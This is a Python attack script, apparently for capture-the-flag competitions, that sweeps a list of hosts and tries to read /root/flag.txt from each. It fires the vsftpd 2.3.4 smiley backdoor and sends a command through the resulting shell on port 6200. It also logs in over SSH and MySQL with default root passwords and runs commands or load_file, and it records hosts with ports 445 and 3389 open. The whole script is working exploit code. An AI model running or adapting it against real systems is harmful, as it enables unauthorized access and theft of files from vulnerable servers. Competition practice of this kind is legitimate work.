import re,threading,ftplib,paramiko,socket,MySQLdb,time

class get_flag():
    def __init__(self,host,port):
        self.host=host
        self.port=port
    def open6200(self):
        try:
            ftp=ftplib.FTP()
            ftp.connect(self.host,21)
            ftp.login('root:)','')
        except:
            pass
    def conn6200(self):
        try:
            sock=socket.socket()
            sock.settimeout(5)
            sock.connect((self.host,6200))
            sock.send(b'cat /root/flag.txt\n')
            print(self.host,6200,sock.recv(1024))
        except:
            pass
    def ssh(self):
        try:
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host,self.port,'root','123456',timeout=5)
            std1,std2,std3=ssh.exec_command('cat /root/flag.txt')
            print(self.host,self.port,std2.read())
        except:
            pass
    def mysql(self):
        try:
            mysql=MySQLdb.connect(self.host,'root','root')
            cursor=mysql.cursor()
            cursor.execute('SELECT load_file("/root/flag.txt");')
            print(self.host,self.port,cursor.fetchone())
        except:
            pass
    def thread(self):
        if self.port==21:
            threading.Thread(target=self.open6200,args=[]).start()
            time.sleep(0.2)
            threading.Thread(target=self.conn6200,args=[]).start()
        elif self.port==22:
            threading.Thread(target=self.ssh,args=[]).start()
        elif self.port==445:
            with open('port445.txt','a') as file:
                file.write(self.host+'\n')
        elif self.port==3306:
            threading.Thread(target=self.mysql,args=[]).start()
        elif self.port==3389:
            with open('port3389.txt','a') as file:
                file.write(self.host+'\n')
        else:
            pass
with open('port.txt','r') as file:
    ip_port=file.readlines()
    for r in ip_port:
        host=re.findall('ip(.*?)port',r)
        port=re.findall('port(.*?)\n',r)
        connect=get_flag(host[0],int(port[0]))
        connect.thread()